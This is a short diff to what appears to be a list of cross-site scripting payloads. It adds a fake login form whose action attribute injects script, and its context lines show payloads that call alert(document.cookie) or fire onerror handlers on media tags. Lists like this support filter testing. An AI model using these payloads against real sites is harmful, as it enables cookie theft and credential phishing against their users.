@@ -523,3 +523,4 @@ foo\’; alert(document.cookie);//’;
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
+<form action=“;alert(1)//123><input type=“text”>Username1<input type=“text”>Password<input type=“text”><input type=“submit” value=“Login”></form>
